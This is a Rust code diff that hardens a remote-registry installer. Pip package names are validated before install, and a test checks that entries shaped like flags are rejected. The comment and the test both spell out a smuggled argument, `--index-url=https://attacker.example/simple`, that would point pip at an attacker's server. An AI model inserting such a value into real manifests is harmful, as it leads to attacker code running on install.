@@ -412,7 +412,19 @@ fn copy_dir_contents(src: &Path, dst: &Path) -> Result<(), RemoteInstallError> {
 }
 
 /// Run `pip install <pkg>` for each declared package.
+///
+/// Every entry is validated first. These packages come from a **remote**
+/// registry manifest, so they are less trustworthy than a local one, and each
+/// becomes an argv element for `pip`, which reads a leading `-` as a flag. An
+/// entry like `--index-url=https://attacker.example/simple` would otherwise
+/// redirect the index and execute attacker-controlled `setup.py` code. The
+/// validation is shared with `PythonExecutor::setup_venv` so both install paths
+/// enforce the same rule.
 fn install_pip_packages(packages: &[String]) -> Result<(), RemoteInstallError> {
+    for pkg in packages {
+        apollia_tools::tools::python_executor::validate_package_spec(pkg)
+            .map_err(|e| RemoteInstallError::PipInstallFailed(e.to_string()))?;
+    }
     for pkg in packages {
         let output = std::process::Command::new("pip")
             .args(["install", pkg.as_str()])
@@ -685,5 +697,32 @@ mod tests {
         let entries: Vec<RegistryEntry> = serde_json::from_str(&content).expect("parse");
         assert_eq!(entries.len(), 1, "re-install must not duplicate the entry");
         assert_eq!(entries[0].version, "0.2.0");
+    }
+
+    // GIVEN a remote registry manifest declaring a flag-shaped package
+    // WHEN the pip install step runs
+    // THEN it refuses before invoking pip. A remote manifest is the least
+    //      trustworthy source of these strings, and pip would read a leading '-'
+    //      as an option, redirecting the index to an attacker's server.
+    #[test]
+    fn test_remote_packages_cannot_smuggle_a_pip_flag() {
+        let hostile = vec![
+            "requests".to_string(),
+            "--index-url=https://attacker.example/simple".to_string(),
+        ];
+        match install_pip_packages(&hostile) {
+            Err(RemoteInstallError::PipInstallFailed(msg)) => {
+                assert!(msg.contains("flag"), "reason should name the flag: {msg}");
+            }
+            other => panic!("expected PipInstallFailed, got {other:?}"),
+        }
+    }
+
+    // GIVEN an empty package list
+    // WHEN the pip install step runs
+    // THEN it succeeds without invoking pip at all
+    #[test]
+    fn test_no_packages_is_a_no_op() {
+        assert!(install_pip_packages(&[]).is_ok());
     }
 }
